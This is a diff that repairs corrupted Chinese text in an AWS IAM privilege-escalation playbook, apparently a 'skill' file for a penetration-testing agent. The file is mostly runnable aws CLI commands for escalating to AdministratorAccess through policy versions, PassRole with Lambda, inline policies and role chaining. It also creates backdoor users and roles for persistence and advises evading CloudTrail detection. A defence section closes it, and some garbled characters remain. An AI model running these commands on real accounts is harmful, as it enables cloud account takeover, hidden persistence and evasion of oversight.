@@ -1,6 +1,6 @@
 ---
 name: cloud-iam-001
-description: "AWS IAM 权限提升是云渗透测试中的核心技能 适用于: 已获?AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权; 目标 IAM 用户附加了多?managed policy ?inline policy，可能存在权限重叠或遗漏; 发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限"
+description: "AWS IAM 权限提升是云渗透测试中的核心技能 适用于: 已获取 AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权限; 目标 IAM 用户附加了多个 managed policy 和 inline policy，可能存在权限重叠或遗漏; 发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限"
 license: MIT
 metadata:
   author: HOS-Sec-Engine
@@ -24,19 +24,19 @@ metadata:
   confidence: 0.93
 ---
 # IAM Privilege Escalation Techniques
-AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了低权?IAM 凭证后，通过分析和利?IAM 策略配置错误，可以提升到管理员权限。Rhino Security Labs 定义?30+ ?IAM 权限提升路径（参?https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/）。最常见的路径包括：(1) iam:CreatePolicyVersion ?创建新版本策略并设为默认?2) iam:PassRole + 服务创建权限 ?通过 Lambda、EC2、Glue 等服务以高权限角色执行代码；(3) sts:AssumeRole ?担任权限更高的角色；(4) iam:PutUserPolicy/AttachUserPolicy ?直接修改自己的策略。此外，资源基础策略（如 S3 bucket policy、SQS queue policy、Lambda resource policy）中的宽?Principal 配置也可被利用。权限提升的关键在于枚举当前凭证的有效权限（iam:GetUser、iam:ListAttachedUserPolicies、iam:SimulatePrincipalPolicy），然后找到可提权的路径
+AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了低权限 IAM 凭证后，通过分析和利用IAM 策略配置错误，可以提升到管理员权限。Rhino Security Labs 定义了 30+ 种IAM 权限提升路径（参考https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/）。最常见的路径包括：(1) iam:CreatePolicyVersion ?创建新版本策略并设为默认;(2) iam:PassRole + 服务创建权限 →通过 Lambda、EC2、Glue 等服务以高权限角色执行代码；(3) sts:AssumeRole ?担任权限更高的角色；(4) iam:PutUserPolicy/AttachUserPolicy ?直接修改自己的策略。此外，资源基础策略（如 S3 bucket policy、SQS queue policy、Lambda resource policy）中的宽松的 Principal 配置也可被利用。权限提升的关键在于枚举当前凭证的有效权限（iam:GetUser、iam:ListAttachedUserPolicies、iam:SimulatePrincipalPolicy），然后找到可提权的路径
 ## 何时使用
 
 ### 触发场景
 
-- 已获?AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权
-- 目标 IAM 用户附加了多?managed policy ?inline policy，可能存在权限重叠或遗漏
+- 已获取 AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权限
+- 目标 IAM 用户附加了多个 managed policy 和 inline policy，可能存在权限重叠或遗漏
 - 发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限
 - 目标 IAM policy 允许 iam:CreatePolicyVersion 且未限制 set-as-default
-- 存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻
+- 存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻击
 - Lambda 函数配置了高权限执行角色，可通过修改函数代码以该角色执行
 - 发现 IAM 凭证泄露（GitHub 泄露、配置文件泄露、日志泄露）
-- 资源基础策略（Resource-based Policy）中存在宽松?Principal 配置
+- 资源基础策略（Resource-based Policy）中存在宽松的 Principal 配置
 
 ### 关键词
 
@@ -44,12 +44,12 @@ AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了
 
 ### 识别指标
 
-- IAM 用户权限中包?iam:* ?iam:CreatePolicyVersion
-- 用户权限中包?iam:PassRole 和特定服务创建权限（?lambda:CreateFunction
-- 用户权限中包?sts:AssumeRole 且目标角色权限更
-- 用户权限中包?iam:PutUserPolicy ?iam:AttachUserPolicy
+- IAM 用户权限中包含 iam:* ?iam:CreatePolicyVersion
+- 用户权限中包含 iam:PassRole 和特定服务创建权限（如lambda:CreateFunction
+- 用户权限中包含 sts:AssumeRole 且目标角色权限更高
+- 用户权限中包含 iam:PutUserPolicy ?iam:AttachUserPolicy
 - Lambda 函数执行角色包含 AdministratorAccess 或高权限策略
-- 发现 AccessKey 但权限有限，需进一步探测可用权?
+- 发现 AccessKey 但权限有限，需进一步探测可用权限
 
 ### 别名
 
@@ -57,87 +57,87 @@ AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了
 
 ## 操作检查清单
 
-1. 使用 sts:get-caller-identity 确认当前身份、账?ID ?ARN
+1. 使用 sts:get-caller-identity 确认当前身份、账户 ID ?ARN
 2. 枚举当前用户权限：iam:list-attached-user-policies、iam:list-user-policies
 3. 获取每个策略的详细内容：iam:get-policy-version
 4. 使用 iam:simulate-principal-policy 测试潜在提权权限
-5. 检查是否有 iam:CreatePolicyVersion + set-as-default 的提权路
+5. 检查是否有 iam:CreatePolicyVersion + set-as-default 的提权路径
 6. 检查是否有 iam:PassRole 权限，并枚举可用的高权限角色
-7. 检查是否有 sts:AssumeRole 权限，并分析目标角色的信任策
+7. 检查是否有 sts:AssumeRole 权限，并分析目标角色的信任策略
 8. 检查是否有 iam:PutUserPolicy/AttachUserPolicy 权限直接提权
-9. 检?Lambda 函数执行角色权限，评?Lambda 提权路径
-10. 检查资源基础策略（S3 bucket policy、SQS policy、Lambda policy
-11. 使用 Pacu 自动化检测和利用所有可用提权路
+9. 检查 Lambda 函数执行角色权限，评估 Lambda 提权路径
+10. 检查资源基础策略（S3 bucket policy、SQS policy、Lambda policy)
+11. 使用 Pacu 自动化检测和利用所有可用提权路径
 12. 提权后验证新权限：aws sts get-caller-identity、aws iam list-users
 
 ## 技术手段
 
-- iam:CreatePolicyVersion ?创建策略新版本并设为默认，直接修改策略权
-- iam:PassRole + lambda:CreateFunction ?创建 Lambda 函数以高权限角色执行代码
+- iam:CreatePolicyVersion →创建策略新版本并设为默认，直接修改策略权限
+- iam:PassRole + lambda:CreateFunction →创建 Lambda 函数以高权限角色执行代码
 - iam:PassRole + ec2:RunInstances ?创建 EC2 实例以高权限角色执行命令
 - iam:PassRole + glue:CreateJob ?创建 Glue Job 以高权限角色执行代码
-- sts:AssumeRole ?直接担任更高权限的角
-- iam:PutUserPolicy ?添加 inline policy 到当前用
-- iam:AttachUserPolicy ?附加 managed policy 到当前用
-- iam:UpdateLoginProfile ?修改其他用户的控制台密码
-- iam:CreateAccessKey ?为高权限用户创建新的 AccessKey
-- iam:AddUserToGroup ?将当前用户加入高权限
-- 资源基础策略注入 ?修改 S3 bucket policy ?Lambda resource policy 放宽权限
-- 角色链提??通过多个账户间的 AssumeRole 形成角色
-- Lambda Layer 注入 ?创建包含恶意代码?Lambda Layer 并附加到目标函数
+- sts:AssumeRole ?直接担任更高权限的角色
+- iam:PutUserPolicy ?添加 inline policy 到当前用户
+- iam:AttachUserPolicy ?附加 managed policy 到当前用户
+- iam:UpdateLoginProfile →修改其他用户的控制台密码
+- iam:CreateAccessKey →为高权限用户创建新的 AccessKey
+- iam:AddUserToGroup ?将当前用户加入高权限组
+- 资源基础策略注入 →修改 S3 bucket policy → Lambda resource policy 放宽访问权限
+- 角色链提取 → 通过多个账户间的 AssumeRole 形成角色链
+- Lambda Layer 注入 ?创建包含恶意代码的Lambda Layer 并附加到目标函数
 
 ## 实战经验
 
 ### 症状
 
-- IAM 用户附加了多?managed policy，其中至少一个包?iam: 权限
-- 用户?iam:CreatePolicyVersion 权限但策略文档中缺少限制条件
-- 用户?iam:PassRole 权限且能列出高权?IAM 角色
-- 用户?sts:AssumeRole 权限且信任策略未限制 source account
-- Lambda 函数的执行角色包?AdministratorAccess 或敏感权
-- S3 bucket policy ?SQS queue policy ?Principal ?"*" 或包含攻击者账
-- 用户?iam:UpdateLoginProfile 权限，可修改其他用户的密?
+- IAM 用户附加了多个 managed policy，其中至少一个包含 iam: 权限
+- 用户有iam:CreatePolicyVersion 权限但策略文档档中缺少限制条件
+- 用户有iam:PassRole 权限且能列出高权限 IAM 角色
+- 用户有sts:AssumeRole 权限且信任策略未限制 source account
+- Lambda 函数的执行角色包含 AdministratorAccess 或敏感权限
+- S3 bucket policy ?SQS queue policy ?Policy 中的 Principal"*" 或包含攻击者账户
+- 用户有iam:UpdateLoginProfile 权限，可修改其他用户的密码
 
 ### 根因分析
 
-- 管理员使用通配符权限（?"Action": "iam:*"）而非最小权限原
-- 策略中缺?Condition 限制，允许无约束?iam:CreatePolicyVersion
-- iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*"
-- sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume
-- Lambda 函数创建时使用了高权限角色，且函数代码用户可
-- 资源基础策略未正确验?Principal，导致跨账户权限泄露
-- IAM policy 版本管理：CreatePolicyVersion 最多允?5 个版本，攻击者可创建新版本覆盖原有策
+- 管理员使用通配符权限（如"Action": "iam:*"）而非最小权限原则
+- 策略中缺少Condition 限制，允许无约束的 iam:CreatePolicyVersion
+- iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*")
+- sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume)
+- Lambda 函数创建时使用了高权限角色，且函数代码用户可修改
+- 资源基础策略未正确验证 Principal，导致跨账户权限泄露
+- IAM policy 版本管理：CreatePolicyVersion 最多允许 5 个版本，攻击者可创建新版本覆盖原有策略
 - Service Control Policies (SCP) 未正确配置，无法阻止权限提升操作
 
 ### 实战观察
 
 - 使用 iam:GetUser、iam:ListAttachedUserPolicies、iam:ListUserPolicies 枚举当前权限
-- iam:SimulatePrincipalPolicy 可模拟测试权限，但需?iam:SimulatePrincipalPolicy 权限本身
+- iam:SimulatePrincipalPolicy 可模拟测试权限，但需要 iam:SimulatePrincipalPolicy 权限本身
 - 使用 Pacu (https://github.com/RhinoSecurityLabs/pacu) 自动化检测和利用 IAM 权限提升路径
 - AWS Organizations ?SCP 可以在组织级别阻止某些操作，即使 IAM policy 允许
 - Permissions Boundary 可以限制 IAM 实体能获得的最大权限，即使策略更宽
 - Lambda 函数代码可以通过环境变量或层（Layers）注入恶意代
-- 某些服务（如 Glue、DataPipeline、SageMaker）允许执行自定义代码，结?PassRole 可提
-- 跨账?AssumeRole 链：Account A ?Account B ?Account A (Admin)，形成角色链提升
+- 某些服务（如 Glue、DataPipeline、SageMaker）允许执行自定义代码，结合 PassRole 可提权
+- 跨账户AssumeRole 链：Account A ?Account B ?Account A (Admin)，形成角色链提升
 
 ### 常见错误
 
-- 未检?Permissions Boundary ?SCP，导致提权路径实际不可用
-- 只关?managed policy，忽略了 inline policy 可能包含额外权限
+- 未检查 Permissions Boundary 和 SCP，导致提权路径实际不可用
+- 只关联managed policy，忽略了 inline policy 可能包含额外权限
 - 未考虑资源基础策略（bucket policy、role trust policy）可能放宽权
 - 假设 iam:PassRole 权限足够，但未验证是否能创建使用该角色的服务
-- 未考虑 MFA 要求，某些角?require MFA 但攻击者没
-- 忽略了策略中?Condition 字段（如 aws:RequestedRegion、aws:SourceIp
+- 未考虑 MFA 要求，某些角色 require MFA 但攻击者没有
+- 忽略了策略中的 Condition 字段（如 aws:RequestedRegion、aws:SourceIp
 - 只尝试了标准的提权路径，未组合多个低权限操作达到提权效果
 
 ### 补充说明
 
-- IAM 权限提升的核心思路：枚??分析 ?利用 ?验证
-- 使用 aws sts get-caller-identity 确认当前身份和账?ID
-- 使用 iam simulating policy 工具可离线分析策略文件中的潜在提权路
+- IAM 权限提升的核心思路：枚举 → 分析 → 利用 → 验证
+- 使用 aws sts get-caller-identity 确认当前身份和账户 ID
+- 使用 iam simulating policy 工具可离线分析策略文档件中的潜在提权路径
 - 某些提权路径可能需要多个步骤组合，?iam:CreatePolicyVersion + iam:AttachUserPolicy
 - 提权后应立即创建后门（持久化访问），因为原凭证可能随时被轮换
-- AWS CloudTrail 会记录所?IAM 操作，提权操作极易被检测，需注意隐蔽?
+- AWS CloudTrail 会记录所有 IAM 操作，提权操作极易被检测，需注意隐蔽性
 
 ## 示例
 
@@ -146,11 +146,11 @@ AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了
 利用 iam:CreatePolicyVersion 创建新策略版本并设为默认，将当前用户策略修改为管理员权限
 
 ```
-# 1. 确认当前用户?CreatePolicyVersion 权限
+# 1. 确认当前用户有CreatePolicyVersion 权限
 aws sts get-caller-identity
 aws iam list-attached-user-policies --user-name current-user
 
-# 2. 获取当前策略?ARN（假设为 arn:aws:iam::123456789012:policy/MyPolicy）
+# 2. 获取当前策略ARN（假设为 arn:aws:iam::123456789012:policy/MyPolicy）
 aws iam get-policy-version \
   --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
   --version-id v1
@@ -172,7 +172,7 @@ aws iam create-policy-version \
 aws iam list-users
 aws s3 ls
 
-# 注意：每个策略最?5 个版本，可能需要先删除旧版本
+# 注意：每个策略最多 5 个版本，可能需要先删除旧版本
 aws iam delete-policy-version \
   --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
   --version-id v1
@@ -183,7 +183,7 @@ aws iam delete-policy-version \
 利用 iam:PassRole ?lambda:CreateFunction 权限，创建以高权限角色执行的 Lambda 函数
 
 ```
-# 1. 枚举可用?IAM 角色
+# 1. 枚举可用的 IAM 角色
 aws iam list-roles --query "Roles[].{ARN:Arn,Name:RoleName}" --output table
 
 # 2. 检查目标角色的权限（假设为 AdminRole）
@@ -192,7 +192,7 @@ aws iam get-policy-version \
   --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy \
   --version-id v1
 
-# 3. 确认当前用户?PassRole 权限
+# 3. 确认当前用户有PassRole 权限
 aws iam simulate-principal-policy \
   --policy-source-arn arn:aws:iam::123456789012:user/current-user \
   --action-names iam:PassRole \
@@ -220,7 +220,7 @@ PYEOF
 
 zip exploit.zip exploit.py
 
-# 5. 创建 Lambda 函数（使?AdminRole）
+# 5. 创建 Lambda 函数（使用 AdminRole）
 aws lambda create-function \
   --function-name escalate \
   --runtime python3.9 \
@@ -263,7 +263,7 @@ export AWS_SESSION_TOKEN={SessionToken}
 aws sts get-caller-identity
 
 # 6. 跨账户角色链
-# Account A (当前) ?AssumeRole ?Account B (中间) ?AssumeRole ?Account A (管理?
+# Account A (当前) → AssumeRole → Account B (中间) → AssumeRole → Account A (管理员)
 aws sts assume-role \
   --role-arn arn:aws:iam::999999999999:role/CrossAccountRole \
   --role-session-name chain-1
@@ -273,9 +273,9 @@ aws sts assume-role \
   --role-arn arn:aws:iam::123456789012:role/AdminRole \
   --role-session-name chain-2
 
-# 7. 注意检查角色是否要?MFA
+# 7. 注意检查角色是否要求 MFA
 # 如果 trust policy 中有 "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
-# 则需?MFA token 才能 assume
+# 则需要 MFA token 才能 assume
 ```
 
 ### iam:PutUserPolicy 直接策略注入
@@ -283,7 +283,7 @@ aws sts assume-role \
 利用 iam:PutUserPolicy ?iam:AttachUserPolicy 直接向当前用户添加管理员策略
 
 ```
-# 1. 确认当前用户?PutUserPolicy 权限
+# 1. 确认当前用户有PutUserPolicy 权限
 aws sts get-caller-identity
 
 # 2. 使用 PutUserPolicy 添加 inline policy
@@ -299,7 +299,7 @@ aws iam put-user-policy \
     }]
   }'
 
-# 3. 或使?AttachUserPolicy 附加 managed policy
+# 3. 或使用 AttachUserPolicy 附加 managed policy
 aws iam attach-user-policy \
   --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
@@ -321,7 +321,7 @@ aws iam create-access-key --user-name root
 利用 S3 bucket policy、SQS queue policy ?Lambda resource policy 中的宽松配置获取权限
 
 ```
-# 1. 检?S3 bucket policy 中是否有宽松 Principal
+# 1. 检查 S3 bucket policy 中是否有宽松 Principal
 aws s3api get-bucket-policy --bucket target-bucket --output text | jq
 
 # 2. 如果 bucket policy 允许 PutBucketPolicy，注入新策略
@@ -336,12 +336,12 @@ aws s3api put-bucket-policy --bucket target-bucket --policy '{
   }]
 '}'
 
-# 3. 检?SQS queue policy
+# 3. 检查 SQS queue policy
 aws sqs get-queue-attributes \
   --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/my-queue \
   --attribute-names Policy
 
-# 4. 检?Lambda resource policy
+# 4. 检查 Lambda resource policy
 aws lambda get-policy --function-name target-function
 
 # 5. 如果 Lambda resource policy 允许 lambda:InvokeFunction
@@ -352,7 +352,7 @@ aws lambda invoke \
   response.json
 
 # 6. 利用 IAM Role Trust Policy
-# 如果角色信任策略?Principal 为任意账户（未限?ExternalId）
+# 如果角色信任策略Principal 为任意账户（未限制ExternalId）
 # 可从外部账户 assume 该角色
 aws sts assume-role \
   --role-arn arn:aws:iam::123456789012:role/VulnerableRole \
@@ -361,39 +361,39 @@ aws sts assume-role \
 
 ### IAM 凭证滥用与持久化
 
-利用已获取的 IAM 凭证进行权限探测、横向移动和持久化访
+利用已获取的 IAM 凭证进行权限探测、横向移动和持久化访问
 
 ```
 # 1. 确认当前身份和权限范围
 aws sts get-caller-identity
 
-# 2. 枚举所?IAM 用户和角色
+# 2. 枚举所有 IAM 用户和角色
 aws iam list-users --query "Users[].{Name:UserName,ARN:Arn}"
 aws iam list-roles --query "Roles[].{Name:RoleName,ARN:Arn}"
 
 # 3. 枚举所有策略
 aws iam list-policies --scope Local --query "Policies[].Arn"
 
-# 4. 检?EC2 实例配置文件（可能包含高权限角色）
+# 4. 检查 EC2 实例配置文件（可能包含高权限角色）
 aws ec2 describe-instances --query "Reservations[].Instances[].IamInstanceProfile"
 
-# 5. 检查是否存?Lambda 函数可修改
+# 5. 检查是否存在 Lambda 函数可修改
 aws lambda list-functions --query "Functions[].{Name:FunctionName,Role:Role}"
 
-# 6. 持久化方?1：创建新?IAM 用户
+# 6. 持久化方式 1：创建新的 IAM 用户
 aws iam create-user --user-name backdoor-user
 aws iam attach-user-policy \
   --user-name backdoor-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 aws iam create-access-key --user-name backdoor-user
 
-# 7. 持久化方?2：修改现有用户的策略
+# 7. 持久化方式 2：修改现有用户的策略
 aws iam put-user-policy \
   --user-name admin-user \
   --policy-name backdoor \
   --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
 
-# 8. 持久化方?3：创?IAM 角色
+# 8. 持久化方式 3：创建 IAM 角色
 aws iam create-role \
   --role-name backdoor-role \
   --assume-role-policy-document '{
@@ -409,7 +409,7 @@ aws iam attach-role-policy \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
-### 使用 Pacu 自动?IAM 权限提升
+### 使用 Pacu 自动化 IAM 权限提升
 
 使用 Pacu 框架自动化检测和利用 IAM 权限提升路径
 
@@ -448,14 +448,14 @@ Pacu (my_session) > ls
 
 # 7. 导出结果
 Pacu (my_session) > export_creds
-# 导出提权后获取的所有凭?
+# 导出提权后获取的所有凭证
 ```
 
 ## 验证标准
 
 ### 验证指标
 
-- CreatePolicyVersion 返回成功?set-as-default 生效
+- CreatePolicyVersion 返回成功set-as-default 生效
 - Lambda 函数创建成功并能以目标角色执
 - sts:AssumeRole 返回临时凭证（AccessKeyId、SecretAccessKey、SessionToken
 - PutUserPolicy 返回成功，当前用户策略已更新
@@ -465,37 +465,37 @@ Pacu (my_session) > export_creds
 ### 成功标志
 
 - 成功获取 AdministratorAccess 或等效高权限
-- 能够列出所?IAM 用户和角色（之前无法访问
+- 能够列出所有 IAM 用户和角色（之前无法访问
 - 能够创建/删除 IAM 实体（用户、角色、策略）
-- 能够访问 S3、EC2 等其?AWS 服务的所有资
-- sts:get-caller-identity 显示已切换到高权限角
+- 能够访问 S3、EC2 等其他 AWS 服务的所有资
+- sts:get-caller-identity 显示已切换到高权限角色
 - 临时凭证在有效期内且权限正确
 
 ### 误报标志
 
 - 权限包含 iam:CreatePolicyVersion 但策略有 Condition 限制（如 ip-address 条件
-- iam:PassRole 权限存在但目标角?trust policy 不允许当前用?assume
-- sts:AssumeRole 需?MFA 但当前凭证未启用 MFA
-- Permissions Boundary 限制了策略能授予的最大权限范
-- SCP（Service Control Policy）在组织级别阻止了提权操
-- 角色?maximum session duration 限制，临时凭证有效期?
+- iam:PassRole 权限存在但目标角色 trust policy 不允许当前用户assume
+- sts:AssumeRole 需要 MFA 但当前凭证未启用 MFA
+- Permissions Boundary 限制了策略能授予的最大权限范围
+- SCP（Service Control Policy）在组织级别阻止了提权操作
+- 角色 →maximum session duration 限制，临时凭证有效期短
 
 ## 防御建议
 
 ### 推荐做法
 
-- 遵循最小权限原则，禁止使用 "Action": "*" ?"iam:*" 通配符策
-- ?iam:CreatePolicyVersion 添加 Condition 限制（如要求 MFA、限制特?IP
-- 严格限制 iam:PassRole 权限：指定具体角?ARN 和服务，禁止 "Resource": "*"
+- 遵循最小权限原则，禁止使用 "Action": "*" ?"iam:*" 通配符策略
+- ?iam:CreatePolicyVersion 添加 Condition 限制（如要求 MFA、限制特定 IP
+- 严格限制 iam:PassRole 权限：指定具体角色 ARN 和服务，禁止 "Resource": "*"
 - 在角色信任策略中使用 ExternalId 防止 confused deputy 攻击
-- 启用 AWS Organizations SCP 在组织级别阻止危?IAM 操作
-- 为所?IAM 实体设置 Permissions Boundary，限制最大权限范
-- 定期审查 IAM 策略，使?IAM Access Analyzer 检测过度授
-- 启用 CloudTrail 对所?IAM 操作进行日志记录和告
-- 对敏感角色启?MFA 要求?Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
-- 使用 AWS IAM credential report 定期检查未使用的凭
+- 启用 AWS Organizations SCP 在组织级别阻止危险 IAM 操作
+- 为所有 IAM 实体设置 Permissions Boundary，限制最大权限范围
+- 定期审查 IAM 策略，使用 IAM Access Analyzer 检测过度授权
+- 启用 CloudTrail 对所有 IAM 操作进行日志记录和告警
+- 对敏感角色启用 MFA 要求：Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
+- 使用 AWS IAM credential report 定期检查未使用的凭证
 - 实施 IAM policy 版本管理审计，监控策略版本变
-- 限制 sts:AssumeRole 的信任策略，明确指定允许?Principal ?Condition
+- 限制 sts:AssumeRole 的信任策略，明确指定允许的 Principal 和 Condition 中的 PrincipalCondition
 
 ### 缓解措施
 
@@ -504,7 +504,7 @@ Pacu (my_session) > export_creds
 - 审查 CloudTrail 日志，识别提权操作的时间线和影响范围
 - 恢复被修改的 IAM 策略到安全版
 - 启用 MFA Delete 防止策略被意外或恶意修改
-- 对受影响的服务启?VPC 端点策略限制访问
+- 对受影响的服务启用 VPC 端点策略限制访问
 - 使用 AWS Config 规则持续监控 IAM 配置合规
 - 如果检测到攻击者创建了后门角色/用户，立即删除并审计关联操作
 
